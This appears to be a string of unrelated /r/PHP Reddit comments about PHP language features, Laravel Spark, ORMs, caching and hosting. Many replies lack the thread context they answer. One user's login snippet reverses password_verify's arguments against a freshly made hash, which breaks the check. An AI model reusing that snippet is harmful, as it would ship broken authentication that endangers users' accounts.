This by the way is why the post was negative, you don't leave me with much to be positive about. The fact you've continued on some tirade you feel justifies your limited world-view to me shows how immature anyone that behaves like this is; how unready for any professional context they are. It's not a personal insult it's an observation from 14 years in business. The Ranting gibberish of the response aside... * Java is for enterprise software, it doesn't hurt me that it's not being used for that everywhere, or that despite me saying possibly as I realize there are edge cases someone would chose to cherry pick. It is generally more prolific in larger organisations, and many of it's commercial offerings are targeted at the enterprise and big business. * your definition of "Someone that wants to help", is the same definition as a stanger offering open-heart surgery to a dying person because they are a nurse or wash towels at the hospital; it's not that they are not trying to be nice; it's that allowing it is dangerous. In case you thought on trying it open heart surgery is also illegal no matter how much you want to help without the requisite qualifications. * Poor front-end is not a reason to rewrite a back-end, maybe they were the back end compliament to your front-end and by refreshing the UI you could avoid future back-end integration issues. TBH you don't deserve my help, the help you need is longer than a reddit post, it'll take years and many hours of iterative posts; which is why I suggested courses, books and talking to someone on their team if available; but I expect you'll bluster on anyway.... TLDR; Don't perform tasks you are vastly under-qualified and under-experienced to do. It's disrespectful, unhelpful and lazy. It is however not disrespectful or unhelpful for someone to tell you that if you identify that these are your issues you should stop! Your problems cannot all be the worlds problem to solve; we all have lives too, some of us regularly have to fix half-ass attempts at software, it puts us in a bad mood to read someone that is entitled, rude and ignorant demand fast answers to complex problems.
Nah dude that's just syntactic sugar. imagecopyresized ( $destination , $source , 320 , 329 , 440 , 402 , 510 , 218 , 112 , 493 ); Is way more readable.
I agree that scalar objects are the proper solution, but that seems almost more pie in the sky than renaming functions. Both are HUGE changes to the core library, and I see resistance for both approaches. Don't get me wrong, I hope something like this lands. I think there is a serious uphill battle for either.
Fixing the function names is maybe doable (with enough traction). Fixing the parameter order seems like it would break to many things to be worthwhile?
I agree!
* this is nor a big company, nor a business * apples to oranges * both of them are poorly done. I'm not saying that they are something i could do, however i don't find it done well enough it
* Named arguments * Autoloader built-in to runtime so we can set a vendor code / include path variable and have use automatically resolve like other languages (I respect and understand it comes from C, I prefer python folder hierarchies) * The PHP equivalent of distributable `.pyc` files; (`.phpc` maybe)? Even though I love libre, I'd like the option to protect code from some people / systems, even if it's just as an idiot blocker or for embedded devices. * More options for async and long-running code in the core To be honest I feel a bit horrible even asking for all this. Maybe it's long past due there was a paid version of PHP as well as a free one. It doesn't have to be $1800 like Nginx+ basic (their lowest paid plan); but it could maybe fund some love. Wouldn't mind seeing a kickstarter aimed towards this. As long as all changes were eventually (say 5 years max) fed back to PHP core I'm sure nobody would care.
Chances are you don't, unless you are using a framework that explicitly mentions middleware. [This link might help you out.](http://www.slimframework.com/docs/concepts/middleware.html)
Yes once you install it there are various ways to extend and customize it.
&gt; array|Traversable That's a really common need and I think a clear indicator that 'array' should really be 'Array' under the hood and implement the correct interfaces. 
I don't get it... I think it could help PHP as a language to have a funded version; I did state my wishlist might be a bit much...
You might be able to create subclasses of scalar objects instead 
I would love generics, so IDEs can understand it much better and save us from simple errors. I would love to be able to do something like $collection = new Collection()&lt;MyObject&gt;; // ... $anObject = $collection-&gt;first(); $anObject-&gt;myMethod(); without needing to do something "hackish" like `/**@var MyObject $anObject */` to have a proper auto completion . It's the #1 thing I would love to see in PHP. But maybe that's too java-like ? I wonder what do you guys think about it
What would this property setter/getter look like?
While I personally dislike the idea, I was mostly trying to convey my sense that people would care rather a lot, and much controversy would likely ensue. (Well, assuming that it got much traction or notice, at least.)
Half the reason I like Laravel is for the collections.
definitely a preferable response to 3 letters and a quote. I couldn't tell if it was a supportive laugh, a STFU laugh, a that's been tried laugh etc (AFAIK Rasmus used to charge pre PHP3 as it was largely an internal tool. It was hidden in project costs but still was charged to the customer). Also to clarify on my part I'm not suggesting they charge for regular PHP; I'm saying all the companies that pay $1800 for nginx+ can STFU and pay PHP too. As I understand it support is also provided on the entry level nginx, so it wouldn't be $1800 profit, but it could really help support core devs and lead them in a less community-driven and more customer-centric way. I'm also not ragging on nginx. I think the amount is a lot because I've been spoilt by zero-cost software, and the thing I wanted pro for I made a poor-mans version of in less than a day; but the older I get the more spoilt I realize I am, and I try to do what I can to progress and change or at least challenge my attitude. I'm hoping others would too.
Unicode… and there won't be a PHP-8.
https://wiki.php.net/rfc/propertygetsetsyntax-v1.2 This was an old RFC that was rejected for PHP 5.6, you may take a look at it and figure out how it will look like once implemented. It will be similar to C# and Swift's property accessors. 
&gt; This will probably break over 50% of all PHP programs, even though I too wish it could be done. It is just way too large of a BC break. I know this is just dreaming, but when I talk about an array object I'm referring to an entirely new kind of thing that otherwise behaves like the array we know today. Otherwise, you're more likely to break 99.99% of everything ever written in PHP. There has to be some path off that crazy thing :) To your point about your example function... function get_user(string $id): User | Error | Null; If the function is unable to process that request, an error should be thrown. Null shouldn't be an option. Maybe I'm way off base here, but isn't the whole point of declaring a return type to provide certainty of what is coming back? If you're not sure, then why specify anything at the language level? Put it in the docblock and don't type hint the return. That's okay, as there isn't a promise of anything in the return type. Another approach to your get_user($id) problem is to always pass a User object back. If there was a problem putting data in, then assign that logic into the User object to be checked by the caller. I personally take this approach on a number of different objects so the promise of the original function is always kept. $user = get_user(123); if ( $user-&gt;isLoaded() === false ) { doSomethingClever(); } 
No. Java doesn't have scalar objects either. Think more like Javascript, Python, Ruby.
How does that turn PHP into Java? Or more specifically, why Java? As far as I know, scalars/primitives are objects in every popular OO language minus C++. In Javascript scalars are objects, so are with C#, Python, Ruby and Scala. The scalar object syntax is more similar to Javascript/Python than Java Id say. Nowadays PHP apparently borrows things from all available languages, if you think addition of a feature makes PHP look like Java, you are seriously delusional. 
True it just has classes for every scalar type 
Would someone mind explaining why this is desirable to me?
;-)
Static Analyzer meaning automatic hunt-and-find? @throws meaning comments as code? If you recognize a need and formalize a solution in an IDE, what would be the point of avoiding integrating it into the language?
First of all check webserver logs, errors should not always show in browser, instead they are normally written to log file.
Why the down votes? It's a valid point.
/r/PHP is not a support subreddit. Please visit /r/phphelp for help, or connect to ##php on Freenode IRC (nickserv registration required). You may also join us on at #phpmentoring on Freenode IRC for community and mentoring discussions.
Ill check it out, wasnt aware of it - I have just always written the cURL myself haha
If you are using a decent IDE and properly document your first function, you don't need that var comment. /** * Decribtions * @return \MyObject */ function first() ...
I can really appreciate this list. Realistically, though, you should probably use a different language \^_^
Late update! But... As /u/p0llk4t said, Spark is definitely using vue: https://spark.laravel.com/
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/symfony] [Converting to another web framework: Basic apps in Symfony and Django : PHP](https://np.reddit.com/r/symfony/comments/4etuca/converting_to_another_web_framework_basic_apps_in/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))* [](#bot)
WHY!? Why are those not camelCase? Grrrrr.
Because they're functions, not class methods ;)
And autoboxing, can't forgot that.
What is the best HTML to PDF rendering library/package for PHP? We've been using MPDF for a while and have had a lot of trouble with semi complex layouts.. what are decent alternatives?
We're definitely on the path to that. There's the [async-interop](https://github.com/async-interop) group, working on PSRs for promises and event loops. There are some "async standard libraries", like [Icicle](https://github.com/icicleio/) and [AMPHP](https://github.com/amphp) (in addition to the fine work being done by the ReactPHP folks). I'm even working on a book, a [sort of beginner's guide to most popular libraries, extensions and patterns](http://assertchris.io/asyncphp) (shameless plug).
I've posted [this](https://github.com/larabros/elogram) before, but I've written an SDK for Instagram's API and would love to get some eyeballs on it.
&gt; Fix the stdlib function names so that people shut the fuck up about it. Amen. 
Named Arguments is my number one whish
How much extra work is it to type password_hash instead of md5?
It's all sugar for things I'm doing already in a more verbose way. The const/immutable thing is the only high-impact thing in the list. And I wouldn't have much need for that any more if there are value objects. 
In hack you can use Pair to specify the return types. function foo(): Pair&lt;int, int&gt;
That collection would be able to store different types, defined when constructed, hence generics. class Collection&lt;T&gt; { public function __construct(array&lt;T&gt; = []); public function add(T $item); public function first() : T; } $collectionA = new Collection&lt;A&gt;; $collectionA-&gt;add(new A()); $collectionB = new Collection&lt;B&gt;; $collectionB-&gt;add(new B()); IDEs could add generics in PHPDoc without language support though. Just like they did for these: /** @var MyObject[] $collection */ 
Yes, but what if I want two Collections, one that has only objects from the class "MyObject" and another one that has only objects from another class "MyOtherObject" ? Like Doctrine's collections for example.
Are you wanting it to run for all methods, or just a certain one?
Not an homework but an amateur trying to do a project :) 
I'm working on Jupyter-PHP, a project to enable the PHP language inside Jupyter notebooks (formerly IPython Notebooks), and I'm looking for contributors ^_^U: https://github.com/Litipk/Jupyter-PHP I have a big TODO list to improve this tool, but I'm advancing slowly because I haven't many spare time.
Property accessors would have the same (or only slightly better) performance characteristics as __get. They still need to reenter the VM.
I have just updated select query and used password hash to encrypt password and password verify to authenticate db password and form posted password $statement = $config-&gt;prepare("select * from login where name = :name" ); $statement-&gt;execute(array(':name' =&gt; $_POST['username']))); $row = $statement-&gt;fetchAll(PDO::FETCH_ASSOC); $hashAndSalt = password_hash($password, PASSWORD_BCRYPT); if(count($row)&gt;0 &amp;&amp; password_verify($row[0]['password'],$hashAndSalt))
&gt; nelmio/alice thanks - I'd never heard of this. for reference, https://github.com/nelmio/alice
yes and no. null is obviously a special case and allowing only null is obviously a lot different than allowing any multitude of types...
will just skip to PHP-9 without unicode 5 years later.
Use PhantomJS (headless browser). If you want pure PHP, use TcPDF.
Hi Subalee I am unsure about your current skill level as a Front End Developer but you need to be very cautious about approaching this project. There are a lot of negatives responses on here for a reason. Helping a charity is very noble but that does not justify taking the project on. If you create something that is plagued with security issues and/or bugs, the charity could end up having to pay someone to in the future to fix your errors. Even worse, data about children could be leaked. That is something you do not want to happen. Due to your inexperience, I would advise against it. Get some experience and spend some time studying to get up to speed. Once you are confident, then you should help out a charity. Since you are a Front End Developer - you should really be looking into using CMS's which can achieve the same goals. If you would like to move your Front End career forward, learn how to work with WordPress or Drupal. These two are very popular and will boost your CV. I do admire your motivation to progress. Every developer needs that. 
To be honest I'm not a huge fan of this specific syntax, as you end up with twice the number of properties, ie `private $_var;` plus `public property $var {}` for every variable. Why not something like this: public $var { get { return $this-&gt;var * 2; } set { $this-&gt; var = $value / 2; } };
That's cool. When our company was choosing the framework at the start of this year, the main selling point of Symfony was LTS. It's great to see that now Laravel has it aswel. If you choose build your application using symfony 3 right now, later upgrade to 3.4, you will have security updates up until 2021. That sounds pretty good. Source: http://symfony.com/doc/current/contributing/community/releases.html#schedule
Method overloading is not needed in dynamically typed languages. PHP is already supports ad-hoc polymorphism.
I'd take function overloading or named parameters. Personally, don't necessarily need both, but one or the other would be enough for me.
damn, i really wish this rfc will pass..this gona silent haters for good
I tried registering and here is their answer : "Thank you for your interest in Priceline Partner Network! Priceline Partner Network provides booking engine solutions and travel inventory for established websites. We represent distribution for the Priceline Group-Booking.com, Priceline.com, Agoda.com plus rental car inventory from Rentalcars.com. We work with select industry partners resulting in a higher level of support for our partnerships. Our primary goal is long-term successful partnerships with highly satisfied partners through the highest level of support from our dedicated account management team. We require existing websites to have an established number of bookings and unfortunately your website did not meet our requirements. If you are a well-funded startup, and can provide us with a completed marketing plan, you can contact Rick.Schneider@priceline.com and we will take a closer look. Experienced online travel entrepreneurs only please. We do encourage you to use the Commission Junction platform in the interim which is the Priceline.com travel affiliate program. http://www.priceline.com/affiliates/priceline_travel_affiliate_program.asp In addition to Commission Junction, you may want to consider these alternatives from our sister companies: Agoda Affiliate Program: https://partners.agoda.com/en-us/index.html?asq=jGXBHFvRg5Z51Emf/bXG4w==&amp;_ga=1.55514466.873635658.1455121037 Booking.com Affiliate Program https://www.booking.com/affiliate-program/index.en-gb.html?label=gen173nr-1FCAEoggJCAlhYSDNiBW5vcmVmcgV1c19jdIgBAZgBLrgBB8gBDdgBAegBAfgBC6gCAw;sid=84867744b33bcdeb9fbf6e56b9d90a41;dcid=1 We encourage you to consider Priceline Partner Network in the future once you have achieved an established number of bookings per day, we will be more than happy to reconsider your application. In return for our higher producing partnerships, we offer a more rewarding commission platform, ensuring upmost profitability for our valued partners. Best of luck in your business plans and please keep Priceline Partner Network in mind in the future once you have successfully grown your online travel site. Regards, Priceline Partner Network" Any way to get access to a Booking API without having a big website?
The only way to create a custom magic method like __get(), __set() and __call() is to edit the internal source code for PHP. This cannot be done by writing PHP code, you have to write native C code. Read this article below if you are interested in doing this: http://www.phpinternalsbook.com/
Sounds great! Looking forward to all of it :-)
I can't believe you got a downvote for that. Given my hourly rate is more than the cost of Spark, I think it's entirely justifiable. 
Docker is not a GUI
Yes, but search term visibility is a good thing to consider when naming something in tech... http://puu.sh/oj7zD/6829f80c2b.png
Congrats /u/utotwel on shipping! Can't wait to get my hands on it.
Thanks!
Make requests via Guzzle client and Xpath through the results. This is a way - not an ideal one.
It should be subscription based
Ah, thanks!
One of the rare few, since majority of Laravel devs are agencies and the majority of Apache Spark users are companies with in house developers. But keep us updated on how often you get confused. I bet it's not often.
Yeah, changing [controllers to be services](http://symfony.com/doc/current/cookbook/controller/service.html) makes it easier to use constructor/setter injection, which means you can just use type hinting and `@var` the different properties.
&gt; should I worry about the performance and the speed? Not if you will use PHP-PM ;) https://github.com/php-pm/php-pm#laravel-example-package However, you should be fine also without it, as million visits a day isn't such a big thing.
This post appears to be missing some context and/or a link. Are you trying to post a library / snippet that does this? Or are you asking for help? If the latter, you should pastebin your current code, the inputs you're giving it and what you expect out. Explain what you've tried so far and where you're stuck.
You can take a look at Ratchet project (uses websockets) http://socketo.me/docs/hello-world
You should be fine. I worry less about framework bloat than my own potential bottle necks e.g.: bad queries, nested queries, bad indexing on tables. I'd generally start caching early in an applications life cycle, I believe that there are few reasons to not investigate caching. Laravel's caching libraries are wrappers around already existing caching engines, e.g.: memcached or redis. If I still felt unsure about an application, I'd probably add web servers or scale the database switching to a read/write setup. Then I'd look into varnish or nignx reverse proxy. However the way you handle performance depends a lot on your application is used and how much money you have.
Not only that. In case of symfony, you could also use [actions bundle](https://github.com/dunglas/DunglasActionBundle). With autowiring it looks pretty usable solution.
[removed]
Or even better: [sabre/vobject](http://sabre.io/vobject/)
I just posted something the other day, looking for something exactly like this. Unfortunately, I'm broke, so buying anything for a personal project isn't going to work for me, but I'm glad it's there when I can convince my fiancee to let me splurge on things she deems unnecessary. lol
Thanks. I truly hope it will be a huge help for people getting their own businesses off the ground.
No? My advice was to start caching early in an applications life cycle. And said there were *few* reasons to not do this. Basically, I was trying to say "you should be caching from day 1" but give myself an out incase somebody said "but but but but" with some weird edge case. 
 class LoggerMail implements LoggerInterface { /** * @var MailerInterface */ private $mailer; /** * @param MailerInterface $mailer */ public function __construct(MailerInterface $mailer) { $this-&gt;mailer = $mailer; } public function log($message){ //your IDE's autocomplete feature should work just fine var_dump($this-&gt;mailer-&gt;send($to, $from, $message)); } 
Fair enough, and I appreciate the response :) Pretty much my only experience with the internals is looking at `zend_language_parser.y`, other than the time I looked into creating a native class which was too unapproachable at the time.
You need this because you are using the container as a *service locator*. "[Service locator](https://en.wikipedia.org/wiki/Service_locator_pattern)" is a pattern, or more commonly called an anti-pattern, because: - it hides dependencies of your class - it makes testing harder - it couples all your code to the container - did I miss another one? Instead I encourage you to use dependency injection, i.e. inject your dependencies directly instead of injection the container (and then use it to retrieve the dependency). That way your IDE will work just fine (as /u/Schweppesale pointed out).
Have a look at [the Symfony plugin](https://plugins.jetbrains.com/plugin/7219?pr=idea)?
Yeah, 1m a day is fine. Just use hhvm if you get close and you can do a few hundred reqs/s. 
&gt; In either way you'll get an error but when it is encoded in the type it should be immediately apparent there are two different states. I hear you, and it might be splitting hairs, but I had looked forward to having declared return types precisely to avoid having to check what the method returned. In other words, if a caller has to check the type of what was returned then what was gained by declaring anything? You would be doing exactly what you were doing before a return type could be declared. I love the fact that PHP can dynamically type, and has the ability to both accept and return any kind of thing into and out of functions. These are key strengths of the language. I also believe that the whole point of type hinting is to lock things down to specifics. It's kind of like the difference between the promise "I'll pay you" to "I'll pay you Monday". What the multiple return type does is like "I'll pay you Monday, Thursday or maybe never". Okay, maybe it's a bad metaphor, but that's how it feels to me anyway.
I find this to be more of a problem with first-party code, actually. As a specific example, I'm working with the reflection APIs for some stuff, and the only common interface is `Reflector` which is fairly useless to hint with, so I still have to then handle the case where `!method_exists($arg, 'getDocComment')` Generally within a library, people seem to be pretty decent at using Interfaces (or maybe I'm exceptionally picky about library choice). There's the more generic problem that it's non-trivial to define interfaces used by other parties, since the only canonical source seems to be PSRs (and maybe a couple of more popular Symfony components) IMO the practical solution for this is probably duck typing; e.g. hint an interface, and *implicitly* implementing it is good enough but I hate that for a huge number of reasons.
&gt; Can't you set the return type to static and it will work? No, because the thing I would like to declare is that the very same object will be returned, not just another instance of that object. That's an important distinction when chaining calls together, that each subsequent call is modifying the same object each time. Thanks for the docblock suggestion when it comes to IDE tracking. I was already aware of that, I was just trying to set things up to be enforced by the Interface at the language level as well.
Laravel runs sites that receive many more than 1 million hits per day.
Have you looked at: https://plugins.jetbrains.com/plugin/7251?pr=phpStorm&amp;showAllUpdates=true It allows PhpStorm to know that for: $mailer = $injector-&gt;make('Foo\Mailer'); That the $mailer variable will now contain an object of type Foo\Mailer. 
There are some other packages mentioned.... occasionally.
the function `dd` is also defined by Laravel in the global scope, so your package will not be usable if used alongside the illuminate/support package (which is pulled in with eloquent and popular outside of Laravel). A solution would be to namespace the function like this: namespace DicDoc { function dd(){} } // 5.6: use function DicDoc\dd; dd($args); // others: DicDoc\dd($args); edit: Also, another solution to this problem for PhpStorm is adding a meta file like this http://php-di.org/doc/ide-integration.html#phpstorm-integration
I really want this for Pimple ;(
Can you imagine if anyone who decided to unsubscribe from a sub would post that before? Very very few people are that idiotic...
Unless you're hosting on a raspberry pi, I think you'll be fine.
There are frameworks like this that literally cost thousands of dollars. $99 for something that is a flexible, extensible framework, that will save far more than 3 hours of work (If you're getting less than $33 an hour, something is wrong.), is extremely reasonable.
Wich site ? What type of config &amp; caching ? 
What is the difference with PHP-PM ? (I've never heard about Varnish..? 
&gt; There is also the fact that Symfony takes a lot more time to setup Symfony is setup in a few minutes with the symfony installer tool, your parameters are handled during install and you can start creating entities right away. What exactly takes longer?
Ok thanks. 
Let's say you have a Wordpress blog, you post on it daily. From yesterday to now your blog hasn't changed, but if you get 1 million views now, your server will go through NGINX, PHP-FPM, load Wordpress from PHP's Opcache, and then load the home page from the Wordpress cache (let's imagine you have a cache plugin for Wordpress) 1 million times (And you can only have enough PHP-FPM processes while you have memory available). What Varnish would do is sit in front of your blog (on another server) and never bother to ask it for a new post until the cache expires (you could set it to 10 minutes or hourly, anything). Varnish works better if you can cache things, if you can't cache them, Varinsh is powerless.
Yeesh. Even if you're not in the US, a US company paying less than $33/hr USD for development... that's pretty sad.
I know that Phpstorm has a solution to deal with this problem, Phpstorm is the best php IDE (for me) but not the unique.
1. No, it really shouldn't 2. How exactly do you suggest that would work?
Yeah, that seems like a very reasonable way to go about it.
The problem is that the variable is not set when you echo it. You include your header.php in the very top of your index file, and it immediately outputs the variable, which at that point has not been set. Only after that you load your actual content file which defines the variable. Now, there are two ways to fix this: Either you have to define the variable beforehands and fill it with an appropriate title (easy to do, check for wether the file exists and if so change the name to be nicer), or (which is probably preferred) change the very structure of your program - when you separate your logic and your output, you don't have this problem. Also, please remember that the approach you are taking - just including the file - is quite unsafe. Because you simply include it, one could load almost any php file you want, simply by using a page parameter like "../../whatever". Lastly, this is not the appropriate subreddit for support. Please go to /r/phphelp for that.
Bye Bye iSwearGetALife
&gt;My opinion is that Lavavel sets a developer up to do all the wrong things. That doesn't mean you can't do it "right" (whatever that is) with Laravel, it's just that out of the box Lavavel seems to be this comedy of errors that allows not so experienced developers to unfold whatever it is they're trying to achieve into a major mess. A typical example is to shoehorn business logic inside controllers and basically create untestable software in the process. I understand this is not "entirely" Laraval's fault but out of the box Lavavel doesn't really educate a developer either. &gt;Let's not get started on the Active Record thing. Holy shit, this Lavavel code base that was dumped in my lap has about 50 models/tables! So there, fuck me. Boom. You hit the nail on the head with this one. Symfony doesn't give you the tools nor examples to do things the wrong way... Doesn't mean you can't do them of course. 
Spark is just a layer on top of Laravel and the license gets you the full source code, so you can add whatever validation you like for user passwords.
Correct. I think it might be as simple as doing something like this in a service provider: $validationFactory-&gt;extend('password', function($fieldName, $value) { //return true if your requirements are met });
This is an interesting idea. Hmm..
What if he is hosting on a raspberry pi and he puts it behind CloudFlare?
WebSockets - https://www.google.com/webhp?q=php+websockets
You need to define $page_title = "Blah" inside index.php at the top, before the call to header.php. Whenever you create a new page, add the $page_title = "Title" at the top. That's the easiest way which works and is in-line with the way you are doing things now.
AJAX+Socket.io: Listen for Socket Events and Broadcast to PHP via AJAX PHP+Redis: Listen for AJAX events and Broadcast to NodeJS via Redis NodeJS+Socket.io+Redis: Listen for Redis events and Broadcast to all connections via Socket.io
A handful of sites that I have heard of. All have the usual caching and such in place I'm sure. Most of them speak to me privately and I don't feel comfortable dragging their names out on Reddit since at least one of them specifically asked me not to mention them.
question for /u/utotwel regarding licensing: "One license grants the right to use the Software on one domain and unlimited development sites." How's that work with sites that use per-subscriber sub domains? I.e. same instance but using the router to match *.domain.com.
keep calm and keep us informed. 
Was this lazy loading of entities or accessing of properties defined on the model? I did some speed tests earlier today. While `__get` was slower than I had thought, it wasn't anything compared to an extra query.
Skimming it, the API seems simple and straightforward enough. The README could do with some examples (and the docs overall could use work). It seems to do a good job picking sane defaults and not allowing a user to screw them up. Only immediate feedback is that the classes that handle key material should attempt to obscure the key from leaking in a backtrace/var_dump/etc. The implementation of `KeyOrPassword` has some redundancies but I don't think users will be affected. It's also not totally obvious how it will handle, basically, `password_needs_rehash` type situations. Assuming a future version says that something is more appropriate than `aes-256-ctr`, it doesn't look like there's a way to check for that and then re-encrypt using the even-better defaults. Future problem?
They could deprecated the old functions while incorporating new ones. Eventually you will have to switch if you want to upgrade. Then someone will write a script to do that for you. 
Thanks :D
m sorry but i am not getting meaning of "interpunction".
I'm in the same position. I'll volunteer you to try it out and report back ;-) In my case there is less emphasis on selling a service on to tech-savvy people. It is more a single service to the client, who will then have many non-tech savvy customers signing up. I'm not sure it Spark is the right thing here or something with a more friendly looking front end.
Curious as to why not? I mean, obviously you shouldn't write code which is going to run terribly *unless* it is cached (because for at least one request it's not going to have warm cache to lean on)... but using cache to reduce the need to run expensive operations seems to me to be the reason caching exists in the first place? 
Punctuation then: https://en.wikipedia.org/wiki/Punctuation
This seems really cool. First time I've heard of something like this. Out of curiosity, have similar efforts been developed for other web frameworks, such as Rails or Django?
As the article mentioned, Docker could have been used instead. I did this here: https://github.com/Hambrook/Docker-Local-Web-Server It means I can use any PHP version I've configured with either Apache or Nginx, MySQL or MariaDB. All concurrently. Although I need to update the docker-compose file to the v2 format. 
Accessing the properties most likely. IIRC every call to `__get` has a chain of like 5 nested functions.
i did that, and yes, the error of not defined goes away. but: it still doesnt reload when i switch to another site. thanks vor the pointer jake jeremy, i will post it there then, and look at the pageloader exactly. as far as the tutorial went, " $tmp_page = basename($_GET['page']);" should prevent exactly that from happening. or do i have to include it on every single include? please answer here to avoid pushing the thread in the future: https://www.reddit.com/r/PHPhelp/comments/4f1j7k/help_with_refreshing_title_tag/
Making primitive types be more like classes and be capable of implementing interfaces and such is something I've wanted to do for a while now.
I recently made a test using apache bench (ab). Render a login page. Laravel made 25 req/sec. CodeIgniter made 366, and Java/Spring made almost 1000. Enough said imho
I actually spent time in this group. They're as stupid as this blog makes them out to be. To not know is fine, to not even bother trying is bad. To give dangerously wrong answers is not okay. I've seen people give code answers with SQL injection vulnerabilities. I'd bet money that every piece of production code these morons write is vulnerable. In that group, you're a moron until you prove otherwise. 
Why does that not shock me. 
Because even the dumbest deserve to be schooled. 
Some of these people have really bloated sense of intellect on par with the Dunning-Kruger Effect
Well you can run whatever in a separate process with [popen](http://php.net/manual/en/function.popen.php) or do threading with [pthreads](http://php.net/pthreads). If you're not sure what the difference is you'll probably want to read up on that first. If you need to do a lot of threading or process management honestly I think you might want to consider some other languages with more fleshed out process/threading support. The PHP stuff just feels sort of anemic compared to a number of other languages out there. If you just have a few things that need to be done in a thread then sure, it's fine.
You might also check out the systemd-nspawn facilities more than adequate, and it has the benefit of already being installed on most Linux distros out of the box today.
I have actually been faced with this problem and I have found a good way to solve this. This might be too complex, but it's not a simple problem to solve reliably. You can look into http://gearman.org for a quick solution. **Start a job** You need a page that will trigger the new job. Let's use an example where you have to "rebuild" something, so add that 'Rebuild' button on your page and when someone clicks it, it executes a code. This code needs to place a new job in the Queue and define a unique identifier = "382948". Once that's done you return complete your request saying "job is queued. To see result open yourapp/progress/382948". **Grabbing a job** You need a worker, something that sits in the background waiting for a job to be submitted. When it is, it needs to open a new "message channel called 382948" and post line-by-line progress into this channel. once job is completed, it's removed from queue and message channel is closed. **Seeing progress live** I've found that using server-side-messages is pretty nice way to send live progress from PHP to your UI (see demo here: http://sink.agiletoolkit.org/realtime/console). Your "progress" page should first set up the UI by displaying the console. Then it needs to establish "server-side-message" link and start reading from the "channel 382948" and posting those messages to the browser. If user refreshes this screen, he will not disrupt execution of the process. I recommend you to look into http://kr.github.io/beanstalkd/ 
A link to a tweet to a blog. OK. Most people would just link the blog and not try to inflate their Twitter traffic.
This was a very interesting read but I can't help but think this is nothing new. I may be mistaken, but I believe everything you've suggested can already be achieved by an ORM like Eloquent?
Kinda reminds me of http://www.notorm.com 
Not very eloquently. 
You start off saying you have read about problems with ORMs, but then suggest brainstorming on a DAL. They are two separate things. You make sweeping generalizations by saying "ORMs work on table level, which is reverse engineered from a DB schema", which is not true, hibernate, doctrine2, sqlalchemy, none of these work like this. Active record is a terrible concept, because it couples your domain models with persistence operations. In the end, you conclude that this "once and for all provide a good solution to N+1 problems". How? I don't mean to be a jerk, but this was just a bunch of ambiguous pseudocode, and some uneducated assumptions. 
Please don't leave, we can change.
1. Your example is incomplete, how does the AdminUser come into existance, is that a constructor example? Where is the object defined and how does the definition specify that it extends User with additional 1:n properties? If you would define it, you would see critical similarities to other ORMs because you need to base it on databases, not datasets. Sometimes a single PK is not enough, see Doctrine and it's hassle with composed PKs. 2. Well, active record will help you with that. It's there, try propel maybe? Most ORMs already sport validation and eventhandlers, so it's more of a must, not that your approach would be anything new. 3. Use SQL, it's not a forbidden language. If you must, query your schema information for proper table names and columns. 4. Your objects should mirror the relationships between tables, because thats all they can store. Your example is a perfect OneToMany. Most of the ORMs will deliver an iteratable array or ArrayCollection. Some will just load the full data set when it's iterated. You can use that already, some ORMs will not allow you to use some kind of deleteAll() though, because it's not recommended. There may be alot of events flying around, if your new thing is a composition of something, it might need to take a look at every object/line/whatever because there might be code based triggers that work with the actual values or something. There is a reason why we have DBMS that supports relationships and keeps the data integrity correct through cascades like MySQL/InnoDB. On top of that you have code/object definition stuff, like in Doctrine, where cascades can happen as well, in addition to events. And you got that orphan removal stuff, and you got a copy of objects flying around in your memory that might need to reflect the -&gt;save() you just ran. It's quite complicated once you get there. 5. Please use SQL? That stuff worked for over 20 years now, almost anyone can read it, execute it, explain it. Rather than digging through your code I would just run it and look at the fired SQL queries, because they are expressive enough. Just put your use case as readable query in a repository related to the managed object? 6. Why exactly? The ORM-layer is not aware of how the upper layer will use the information and therefore delivers what is requested. Injecting some kind of reasoning or explanation of what you want (a subset of a full object), is just too much hassle and you are much more efficient to just specify a special query... or fall back to DBAL. Otherwise larger apps will end in lazyloading-hell, because the software reached year two without a refactor. Maybe it offers some kind of road towards ORM N+1 stuff, but your "Delete all activity" might just be a simple DELETE FROM at the end that just dumped 12GB information and fragmented your DB-Slave #79 to hell.
[Edited]: Some things just seem to be unnatural with Eloquent too. Like joins (not only for querying but to be used through active record), basing your model based on another query, keeping conditions on for active-record consistency. Quite frankly, it's just a different approach, that I think I can improve. I can't be expert on all the ORMs out there, which is why I asked or feedback here in the first place.
So exactly how integrated is Vue.js? We're an angular shop, can the Vue components be swapped out for a completely custom implementation? (easily?)
I think "terrible hacks" is a stretch. Could you elaborate?
Thank you, I didn't know about this one. Looks similar to LessQL, where it pre-fetches ID's for dependencies. I personally think it's not a feasible because the blind-prefetching could be hitting thousands of ID's there on a larger database and as developer there is not much that can be done. It's funny how Jakub confronts Benjamin. Here is how notSQL and lessQL work: foreach($category-&gt;article() as $article) { foreach($article-&gt;tag() as $tag) { // show tag } } Iterating article() actually pre-fetches all the data before iterating. Memory usage. Latency. Next when $article-&gt;tag() is found, it can create query based on all IDs which we have learned from previous query and then iterating starts. This concept does not solve problem on multiple levels of recursion and it also does things behind the scene, which developer may not necessarily like. With the concept I've described, the work can be shifted into SQL pretty easily: $article -&gt; addExpression('tags') -&gt; set ( new Expression('contact_ws(",", {})' , $article-&gt;refSQL('Tag') ); Now when you iterate through article, you already have all the related tags. No magic, straightforward, single query and no pre-fetching.
Can you please elaborate? What is the downside for the practical use in applications?
Sorry, i wanted to keep my examples short and easy to read. 1. AdminUser would be a class extending User. class AdminUser extends User { function init(){ parent::init(); $this-.addCondition('isAdimn', true); } } As far as "AdminUser" is concerned, it does not care how exactly User DataSet is defined, it could be a UNION or few joined tables. 4. My concept is based on DataSets, which can theoretically be separate from tables, so logical relationships between DataSets does not have to mimic actual database structure. Such a relationship could define many-to-many relationships with several additional condition clauses and Category could have relationship to "Article" and another relationship to "ArchivedArticle". In database you wouldn't define two relationships, but logically they can be beneficial. Regarding use of SQL - of course I'm going to use that, but there is a good reason why so many applications use ORM. Currently I see the situation where developer must make a choice - either write queries manually or be slowed down by ORM. I believe there is a better compromise and I'd like to take a go at it.
Just to clarify myself: I think ActiveRecord is a special sub-case of a data mapper like the ORM I just linked to, and its operations can be trivially implemented on top of what's available. Even though the Cake ORM is not an ActiveRecord, it can trivially emulate the examples you have posted here
Same happened with /r/javascript what is about any kind of framework and not vanilla JavaScript anymore and /r/html being basically a combination of /r/javascript and /r/css.
